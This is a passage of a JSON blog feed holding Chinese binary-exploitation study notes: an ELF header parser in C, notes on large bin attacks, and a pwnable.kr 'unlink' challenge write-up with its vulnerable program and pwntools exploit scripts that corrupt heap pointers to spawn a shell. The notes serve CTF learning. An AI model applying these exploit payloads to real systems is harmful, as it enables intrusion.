class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/mman.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdint.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/stat.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;fcntl.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 解析文件头</span></span><br><span class=\"line\"><span class=\"comment\">// int check_elf_head(file)</span></span><br><span class=\"line\"><span class=\"comment\">// &#123;</span></span><br><span class=\"line\"><span class=\"comment\">//     printf(&quot;just a test%d\\n&quot;,file[0]);</span></span><br><span class=\"line\"><span class=\"comment\">//     return 0;</span></span><br><span class=\"line\"><span class=\"comment\">// &#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span> **argv)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">     <span class=\"type\">int</span> fd, i;</span><br><span class=\"line\">    <span class=\"type\">uint8_t</span> *mem;</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">stat</span> <span class=\"title\">st</span>;</span></span><br><span class=\"line\">    <span class=\"type\">char</span> *StringTable, *interp;</span><br><span class=\"line\"></span><br><span class=\"line\">    Elf32_Ehdr *Elf_header;</span><br><span class=\"line\">    Elf32_Phdr *Pro_header;</span><br><span class=\"line\">    Elf32_Shdr *Section_header;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (argc &lt; <span class=\"number\">2</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;usage: %s &lt;executable&gt; \\n&quot;</span>, argv[<span class=\"number\">0</span>]);</span><br><span class=\"line\">        <span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> ((fd = open(argv[<span class=\"number\">0</span>], O_RDONLY)) &lt; <span class=\"number\">0</span>) <span class=\"comment\">//什么情况下会这样呢? 和权限好像没关系</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        perror(<span class=\"string\">&quot;open&quot;</span>);</span><br><span class=\"line\">        <span class=\"built_in\">exit</span>(<span class=\"number\">-1</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (fstat(fd, &amp;st) &lt; <span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        perror(<span class=\"string\">&quot;fstat&quot;</span>);</span><br><span class=\"line\">        <span class=\"built_in\">exit</span>(<span class=\"number\">-1</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    mem = mmap(<span class=\"literal\">NULL</span>, st.st_size, PROT_READ, MAP_PRIVATE, fd, <span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 64位还是32位</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (mem[<span class=\"number\">4</span>] == <span class=\"number\">0x2</span>)</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;it is 64 bit %d\\n&quot;</span>,mem[<span class=\"number\">4</span>]);</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;it is 32 bit %d\\n&quot;</span>,mem[<span class=\"number\">4</span>]);</span><br><span class=\"line\">    <span class=\"comment\">// check_elf_head(mem);</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//头部信息</span></span><br><span class=\"line\">    Elf_header = (Elf32_Ehdr *)mem;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\n&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;e_ident:                           \\t%10x\\n&quot;</span>,Elf_header-&gt;e_ident[<span class=\"number\">16</span>]);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Type:                           \\t%d\\n&quot;</span>,Elf_header-&gt;e_type);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Machine:                        \\t%d\\n&quot;</span>,Elf_header-&gt;e_machine);  <span class=\"comment\">/* Architecture */</span></span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Version:                        \\t%#02x\\n&quot;</span>,Elf_header-&gt;e_version);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Entry point address:            \\t%#02x\\n&quot;</span>,Elf_header-&gt;e_entry);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Start of program headers:       \\t%d(bytes)\\n&quot;</span>,Elf_header-&gt;e_phoff);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Start of section headers:       \\t%d(bytes)\\n&quot;</span>,Elf_header-&gt;e_shoff);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Flags:                          \\t%#02x\\n&quot;</span>,Elf_header-&gt;e_flags);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Size of this header:            \\t%d(bytes)\\n&quot;</span>,Elf_header-&gt;e_ehsize);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Size of program headers:        \\t%d(bytes)\\n&quot;</span>,Elf_header-&gt;e_phentsize);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Number of program headers:      \\t%d\\n&quot;</span>,Elf_header-&gt;e_phnum);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Size of section headers:        \\t%d(bytes)\\n&quot;</span>,Elf_header-&gt;e_shentsize);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Number of section headers:      \\t%d\\n&quot;</span>,Elf_header-&gt;e_shnum);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Section header string table index:\\t%d\\n&quot;</span>,Elf_header-&gt;e_shstrndx);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 解析节信息 readelf  -S</span></span><br><span class=\"line\">    Section_header = (Elf32_Shdr *)&amp;mem[Elf_header-&gt;e_shoff];</span><br><span class=\"line\">    StringTable = &amp;mem[Section_header[Elf_header-&gt;e_shstrndx].sh_offset];</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Section header list:\\n\\n&quot;</span>);</span><br><span class=\"line\">    <span class=\"type\">char</span> a = <span class=\"string\">&#x27;|&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// size flag</span></span><br><span class=\"line\">    <span class=\"comment\">// for (i = 1; i &lt; Elf_header-&gt;e_shnum; i++) &#123;</span></span><br><span class=\"line\">    <span class=\"comment\">//     printf(&quot;%-20s\\t\\t%-10x\\t\\t0x%x\\t\\t%x\\t\\t%c\\n&quot;,&amp;StringTable[shdr[i].sh_name],shdr[i].sh_type,shdr[i].sh_addr,shdr[i].sh_size,shdr[i].sh_flags);</span></span><br><span class=\"line\">    <span class=\"comment\">// &#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;[Nr] Name%-20c\\t\\tType%-10c\\tAddr\\t\\tOff\\tSize\\tES Flg  Al&quot;</span>,a);</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(i = <span class=\"number\">1</span>; i&lt;Elf_header-&gt;e_shnum; i++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\"><span class=\"comment\">/*printf(&quot;\\n[%-2d]  %-20s              %-10x            %08x     %06x    %06x   %02x %02x  %02x &quot;\\</span></span><br><span class=\"line\"><span class=\"comment\"> */</span>     <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\n[%-2d]  %-20s\\t\\t%-10x\\t%08x\\t%06x\\t%06x\\t%02x %02x  %02x &quot;</span>\\</span><br><span class=\"line\">               , i,&amp;StringTable[Section_header-&gt;sh_name],Section_header-&gt;sh_type,Section_header-&gt;sh_addr,\\</span><br><span class=\"line\">               Section_header-&gt;sh_offset,Section_header-&gt;sh_size,Section_header-&gt;sh_entsize,\\</span><br><span class=\"line\">               Section_header-&gt;sh_flags,Section_header-&gt;sh_addralign);</span><br><span class=\"line\">        Section_header++;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 解析段信息</span></span><br><span class=\"line\"><span class=\"comment\">// readelf -l</span></span><br><span class=\"line\">    Pro_header = (Elf32_Phdr *)&amp;mem[Elf_header-&gt;e_phoff];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\n&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\n/*****Program Headers:*****/\\n&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;starting at offset: %d\\n&quot;</span>,Elf_header-&gt;e_phoff);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Number of program headers: %d\\n&quot;</span>,Elf_header-&gt;e_phnum);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Type           Offset   VirtAddr   PhysAddr   FileSiz     MemSiz    Flg\\n&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span>(i = <span class=\"number\">0</span>; i&lt;Elf_header-&gt;e_phnum; i++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d           %-#6x   %-#x   %-#x   %-#5x     %-#5x    %-#x\\n&quot;</span>,Pro_header-&gt;p_type,Pro_header-&gt;p_offset,\\</span><br><span class=\"line\">\t\t\t    Pro_header-&gt;p_vaddr,Pro_header-&gt;p_paddr\\</span><br><span class=\"line\">               ,Pro_header-&gt;p_filesz,Pro_header-&gt;p_memsz,Pro_header-&gt;p_flags);</span><br><span class=\"line\">        Pro_header++;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p>ELF(5)手册 </p>\n<p>ELF官方规范文档</p>\n<p><a href=\"https://refspecs.linuxfoundation.org/elf/gabi4+/contents.html\">https://refspecs.linuxfoundation.org/elf/gabi4+/contents.html</a></p>\n<p><a href=\"https://refspecs.linuxfoundation.org/elf/gabi4+/ch4.eheader.html\">https://refspecs.linuxfoundation.org/elf/gabi4+/ch4.eheader.html</a></p>\n<p><a href=\"https://blog.csdn.net/qfanmingyiq/article/details/124295287\">https://blog.csdn.net/qfanmingyiq/article/details/124295287</a></p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/401446080?utm_id=0\">https://zhuanlan.zhihu.com/p/401446080?utm_id=0</a></p>\n<p><a href=\"https://github.com/jianhong-li/ElfReader\">https://github.com/jianhong-li/ElfReader</a></p>\n<p><a href=\"https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=591986&amp;highlight=elf+%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD\">https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=591986&amp;highlight=elf%2B%BD%E2%CE%F6</a></p>\n",
            "tags": [
                "研究生课程"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-21-pwn-college-Fundamentals/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-21-pwn-college-Fundamentals/",
            "title": "pwn入门-21-pwn.college-Fundamentals",
            "date_published": "2023-03-13T10:54:41.000Z",
            "content_html": "<div class=\"hbe hbe-container\" id=\"hexo-blog-encrypt\" data-wpm=\"Oh, this is an invalid password. Check and try again, please.\" data-whm=\"OOPS, these decrypted content may changed, but you can still have a look.\">\n  <script id=\"hbeData\" type=\"hbeData\" data-hmacdigest=\"e6c7212bcc454d4831365f258f1eabf76f78a92497ff504b3f395af6e5f2a727\"></script>\n  <div class=\"hbe hbe-content\">\n    <div class=\"hbe hbe-input hbe-input-default\">\n      <input class=\"hbe hbe-input-field hbe-input-field-default\" type=\"password\" id=\"hbePass\">\n      <label class=\"hbe hbe-input-label hbe-input-label-default\" for=\"hbePass\">\n        <span class=\"hbe hbe-input-label-content hbe-input-label-content-default\">Hey, password is required here.</span>\n      </label>\n    </div>\n  </div>\n</div>\n<script data-pjax src=\"/lib/hbe.js\"></script><link href=\"/css/hbe.style.css\" rel=\"stylesheet\" type=\"text/css\">",
            "tags": [
                "PWN入门"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-20-pwn-college-UAF%E5%8F%8Atcache/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-20-pwn-college-UAF%E5%8F%8Atcache/",
            "title": "pwn入门-20-pwn.college-UAF及tcache",
            "date_published": "2023-03-13T07:12:24.000Z",
            "content_html": "<div class=\"hbe hbe-container\" id=\"hexo-blog-encrypt\" data-wpm=\"Oh, this is an invalid password. Check and try again, please.\" data-whm=\"OOPS, these decrypted content may changed, but you can still have a look.\">\n  <script id=\"hbeData\" type=\"hbeData\" data-hmacdigest=\"421df2e0c365a1d8fba4ed229382fa53255cde9c20bc8d82027380ff7ee6987d\">757d6246220447313784a310f701cd401fb2b1a545efaab207cb22606a616648dce83e31935e07c038d5318312eaf48212207018a1e312f166cabc16419929bd145ba153f22c084516d022044e26141aa82d476546849ee368eef75b9597e23c92a32019c8195ada1008a60d640feeaa</script>\n  <div class=\"hbe hbe-content\">\n    <div class=\"hbe hbe-input hbe-input-default\">\n      <input class=\"hbe hbe-input-field hbe-input-field-default\" type=\"password\" id=\"hbePass\">\n      <label class=\"hbe hbe-input-label hbe-input-label-default\" for=\"hbePass\">\n        <span class=\"hbe hbe-input-label-content hbe-input-label-content-default\">Hey, password is required here.</span>\n      </label>\n    </div>\n  </div>\n</div>\n<script data-pjax src=\"/lib/hbe.js\"></script><link href=\"/css/hbe.style.css\" rel=\"stylesheet\" type=\"text/css\">",
            "tags": [
                "PWN入门"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-19-%E5%A0%86%E5%85%A5%E9%97%A8%E4%B9%8BLarge-Bin-Attack/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-19-%E5%A0%86%E5%85%A5%E9%97%A8%E4%B9%8BLarge-Bin-Attack/",
            "title": "pwn入门-19-堆入门之Large_Bin_Attack",
            "date_published": "2023-03-08T11:47:35.000Z",
            "content_html": "<p>2.23 与2.30的分析,, 搭建源码,看源码,  做题</p>\n<p>分析漏洞伪造重点,步骤</p>\n<p>large bin 的攻击手法,根据libc的版本不同,随着libc版本的更新,加入了很多新的防御手法</p>\n<p><a href=\"https://blog.csdn.net/qq_41202237/article/details/112825556\">https://blog.csdn.net/qq_41202237/article/details/112825556</a></p>\n<p><a href=\"https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/large-bin-attack/\">https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/large-bin-attack/</a></p>\n<p><a href=\"https://github.com/shellphish/how2heap\">https://github.com/shellphish/how2heap</a></p>\n<p><a href=\"https://blog.csdn.net/A951860555/article/details/115477532\">https://blog.csdn.net/A951860555/article/details/115477532</a></p>\n<p><a href=\"https://lexsd6.github.io/2021/11/07/Largebin%20Attack%20for%20Glibc%202.31%20%E5%AD%A6%E4%B9%A0/\">https://lexsd6.github.io/2021/11/07/Largebin%20Attack%20for%20Glibc%202.31%20学习/</a></p>\n<img src=\"/pwn%E5%85%A5%E9%97%A8-19-%E5%A0%86%E5%85%A5%E9%97%A8%E4%B9%8BLarge-Bin-Attack/image-20230406085208132.png\" alt=\"image-20230406085208132\" style=\"zoom:25%;\">\n\n\n\n<p>gdb里查看源代码 list</p>\n<h1 id=\"2-23\"><a href=\"#2-23\" class=\"headerlink\" title=\"2.23\"></a>2.23</h1><p>可以实现任意地址写</p>\n<p>分析漏洞利用过程,  同时分析源码,   为什么会这样, 以及分析一下可以怎么样做到利用,然后找例题做一下</p>\n<p>下一下libc源码,分析分析 如何进行调试glibc</p>\n<p>为啥那个0x90的有四个值???</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-19-%E5%A0%86%E5%85%A5%E9%97%A8%E4%B9%8BLarge-Bin-Attack/image-20230405220251607.png\" alt=\"image-20230405220251607\"></p>\n<p>1先放进large bin 2后放进去,然后再切歌1? fifo</p>\n<p>还是说2 1都放进largebin里,然后再切割? largebin是filo?</p>\n<p>总的来说,就是要伪造一个chunk,修改bk和bk_nextsize为想要修改的地址(还需要微调,bk的要-0x10,bk_nextsize要-0x20)</p>\n<h1 id=\"2-30后加入了新保护\"><a href=\"#2-30后加入了新保护\" class=\"headerlink\" title=\"2.30后加入了新保护\"></a>2.30后加入了新保护</h1>",
            "tags": [
                "PWN入门"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-18-%E5%A0%86%E5%85%A5%E9%97%A8%E4%B9%8Bunlink/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-18-%E5%A0%86%E5%85%A5%E9%97%A8%E4%B9%8Bunlink/",
            "title": "pwn入门-18-堆入门之unlink",
            "date_published": "2023-03-07T08:52:20.000Z",
            "content_html": "<ul>\n<li>FD&#x3D;P-&gt;fd &#x3D; target addr -12</li>\n<li>BK&#x3D;P-&gt;bk &#x3D; expect value</li>\n<li>FD-&gt;bk &#x3D; BK，即 *(target addr-12+12)&#x3D;BK&#x3D;expect value</li>\n<li>BK-&gt;fd &#x3D; FD，即 *(expect value +8) &#x3D; FD &#x3D; target addr-12</li>\n</ul>\n<p>堆块的链接顺序是从大到小还是??</p>\n<p>Pwnable</p>\n<p>​\tgcc -Wl,-rpath&#x3D;&#x2F;home&#x2F;ubuntu&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.23-0ubuntu3_amd64&#x2F;&#x2F;,–dynamic-linker&#x3D;&#x2F;home&#x2F;ubuntu&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.23-0ubuntu3_amd64&#x2F;ld-linux-x86-64.so.2 1.c</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">tagOBJ</span>&#123;</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">tagOBJ</span>* <span class=\"title\">fd</span>;</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">tagOBJ</span>* <span class=\"title\">bk</span>;</span></span><br><span class=\"line\">\t<span class=\"type\">char</span> buf[<span class=\"number\">8</span>];</span><br><span class=\"line\">&#125;OBJ;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">shell</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">\tsystem(<span class=\"string\">&quot;/bin/sh&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">unlink</span><span class=\"params\">(OBJ* P)</span>&#123;</span><br><span class=\"line\">\tOBJ* BK;</span><br><span class=\"line\">\tOBJ* FD;</span><br><span class=\"line\">\tBK=P-&gt;bk;</span><br><span class=\"line\">\tFD=P-&gt;fd;</span><br><span class=\"line\">\tFD-&gt;bk=BK;</span><br><span class=\"line\">\tBK-&gt;fd=FD;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>* argv[])</span>&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">malloc</span>(<span class=\"number\">1024</span>);</span><br><span class=\"line\">\tOBJ* A = (OBJ*)<span class=\"built_in\">malloc</span>(<span class=\"keyword\">sizeof</span>(OBJ));</span><br><span class=\"line\">\tOBJ* B = (OBJ*)<span class=\"built_in\">malloc</span>(<span class=\"keyword\">sizeof</span>(OBJ));</span><br><span class=\"line\">\tOBJ* C = (OBJ*)<span class=\"built_in\">malloc</span>(<span class=\"keyword\">sizeof</span>(OBJ));</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">// double linked list: A &lt;-&gt; B &lt;-&gt; C</span></span><br><span class=\"line\">\tA-&gt;fd = B;</span><br><span class=\"line\">\tB-&gt;bk = A;</span><br><span class=\"line\">\tB-&gt;fd = C;</span><br><span class=\"line\">\tC-&gt;bk = B;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;here is stack address leak: %p\\n&quot;</span>, &amp;A);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;here is heap address leak: %p\\n&quot;</span>, A);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;now that you have leaks, get shell!\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"comment\">// heap overflow!</span></span><br><span class=\"line\">\tgets(A-&gt;buf);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">// exploit this unlink!</span></span><br><span class=\"line\">\tunlink(B);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;A&quot;*16 + (heap_addr+0x20+0x4) + (stack_addr+0x10) + (shell_addr)</span><br><span class=\"line\">&quot;A&quot;*16 +  (target addr -12)  + ( expect value:ebp -x04)    + (shell_addr)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>​\t\t这个是要把堆中地址</p>\n<p>接收到stack地址,修改返回地址?</p>\n<h1 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h1><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">sh = process(<span class=\"string\">&quot;./unlink&quot;</span>)</span><br><span class=\"line\">ELF=ELF(<span class=\"string\">&quot;./unlink&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">stack = sh.recvline().strip()</span><br><span class=\"line\">heap = sh.recvline().strip()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">payload = p32(ELF.symbols[<span class=\"string\">&#x27;shell&#x27;</span>]) + <span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">12</span>\t + p32(heap+<span class=\"number\">0xc</span>) + p32(stack+<span class=\"number\">0x10</span>) </span><br><span class=\"line\">sh.send(payload)</span><br><span class=\"line\">sh.interactive()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#pwn_ssh = ssh(host=&#x27;pwnable.kr&#x27;,user=&#x27;unlink&#x27;,password=&#x27;guest&#x27;,port=2222)</span></span><br><span class=\"line\">p = process(<span class=\"string\">&quot;/home/unlink/unlink&quot;</span>)</span><br><span class=\"line\">line1=p.readline().strip()</span><br><span class=\"line\">line2=p.readline().strip()</span><br><span class=\"line\">stack_addr = <span class=\"built_in\">int</span>(line1.split(<span class=\"string\">&#x27;: 0x&#x27;</span>)[<span class=\"number\">1</span>], <span class=\"number\">16</span>)</span><br><span class=\"line\">heap_addr = <span class=\"built_in\">int</span>(line2.split(<span class=\"string\">&#x27;: 0x&#x27;</span>)[<span class=\"number\">1</span>], <span class=\"number\">16</span>)</span><br><span class=\"line\">shell_addr = <span class=\"number\">0x080484eb</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(<span class=\"string\">&#x27;A&#x27;</span>*<span class=\"number\">16</span> + p32(heap_addr+<span class=\"number\">0x24</span>) + p32(stack_addr+<span class=\"number\">0x10</span>) + p32(shell_addr))</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>pwnable怎么用exp呢?  写到&#x2F;tmp目录下</p>\n<p><a href=\"https://www.cnblogs.com/dlddw/p/13139172.html\">https://www.cnblogs.com/dlddw/p/13139172.html</a></p>\n<p><a href=\"https://etenal.me/archives/972#C30\">https://etenal.me/archives/972#C30</a></p>\n<p><a href=\"https://www.cnblogs.com/L0g4n-blog/p/13033301.html\">https://www.cnblogs.com/L0g4n-blog/p/13033301.html</a></p>\n<p>调试源代码1</p>\n<p><a href=\"https://www.blackhat.com/presentations/bh-europe-07/Sotirov/Presentation/bh-eu-07-sotirov-apr19.pdf\">https://www.blackhat.com/presentations/bh-europe-07/Sotirov/Presentation/bh-eu-07-sotirov-apr19.pdf</a></p>\n",
            "tags": [
                "PWN入门"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-17-%E5%A0%86%E5%85%A5%E9%97%A8%E4%B9%8Bfasbinattack/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-17-%E5%A0%86%E5%85%A5%E9%97%A8%E4%B9%8Bfasbinattack/",
            "title": "pwn入门-17-堆入门之fasbinattack",
            "date_published": "2023-03-07T06:54:38.000Z",
